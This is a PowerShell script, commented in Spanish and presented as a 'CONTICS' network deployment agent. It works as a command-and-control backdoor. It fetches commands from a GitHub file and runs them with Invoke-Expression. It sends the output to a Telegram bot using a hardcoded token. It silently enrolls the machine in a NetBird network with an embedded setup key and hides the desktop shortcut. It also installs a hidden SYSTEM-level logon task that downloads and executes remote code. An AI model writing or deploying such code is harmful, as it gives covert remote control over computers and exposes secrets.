# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - AGENTE PRO V5
# AUTOR: Gemino - CONTICS INFRA
# ===========================================================================

# --- [1] CONFIGURACIÓN DE RUTAS Y DATOS ---
$GitHubRawUrl  = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-win.ps1'
$TareaUrl      = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-tasks.txt'
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

# Configuración NetBird
$mUrl   = 'https://contics-admin.duckdns.org'
$sKey   = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        $null = Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
        return $true
    } catch { return $false }
}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

# --- [2] RECEPTOR DE TAREAS (C2) ---
Write-Host "`n[1/4] Buscando órdenes en GitHub..." -ForegroundColor Yellow
try {
    $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
    if ($TareaData) {
        $Tarea = $TareaData.Content.Trim()
        if ($Tarea -ne "NONE" -and $Tarea -ne "") {
            $null = Send-Telegram -Message "⚡ *EJECUTANDO EN:* $env:COMPUTERNAME`n`n*Orden:* `$Tarea"
            $Out = Invoke-Expression $Tarea 2>&1 | Out-String
            $null = Send-Telegram -Message "✅ *RESULTADO:*`n$Out"
            Write-Host " [+] Comando ejecutado con éxito." -ForegroundColor Green
        } else {
            Write-Host " [+] Sin órdenes pendientes." -ForegroundColor Gray
        }
    }
} catch {
    Write-Host " [-] Error al leer tareas." -ForegroundColor Red
}

# --- [3] LÓGICA DE RED (NETBIRD) ---
Write-Host "[2/4] Verificando conectividad NetBird..." -ForegroundColor Yellow
if (!(Test-Path $nbPath)) {
    Write-Host " [+] Instalando NetBird..." -ForegroundColor White
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# Asegurar conexión limpia
& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null

# Limpieza de iconos
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }

# --- [4] REPORTE ESTÉTICO ---
Write-Host "[3/4] Generando reporte de nodo..." -ForegroundColor Yellow
Start-Sleep -Seconds 8
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'

if ($lineaIP) {
    $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
    $Msg = "*[OK] NODO CONECTADO*`n`n*Equipo:* $env:COMPUTERNAME`n*IP:* $nbIP"
    $sent = Send-Telegram -Message $Msg
    
    Write-Host "`n [+] ESTATUS:      " -NoNewline; Write-Host "CONECTADO" -ForegroundColor Green
    Write-Host " [+] IP ASIGNADA:  " -NoNewline; Write-Host "$nbIP" -ForegroundColor Yellow
    Write-Host " [+] TELEGRAM:     " -NoNewline; Write-Host "REPORTADO" -ForegroundColor Green
    $nbIP | clip
}

# --- [5] PERSISTENCIA Y CIERRE ---
Write-Host "`n[4/4] Actualizando persistencia..." -ForegroundColor Yellow
$TaskName = "Contics_AtLogon"
$ScriptCmd = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr '$GitHubRawUrl' -UseBasicParsing)`""

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ScriptCmd`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null

Write-Host " [+] PERSISTENCIA:  " -NoNewline; Write-Host "ACTIVA (LogOn)" -ForegroundColor Green
Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Abriendo panel de gestión..." -ForegroundColor Gray

# Abre la página que te gusta
Start-Process $mUrl 

Write-Host "`nProceso completado. Sistema CONTICS en línea." -ForegroundColor White
Start-Sleep -Seconds 2
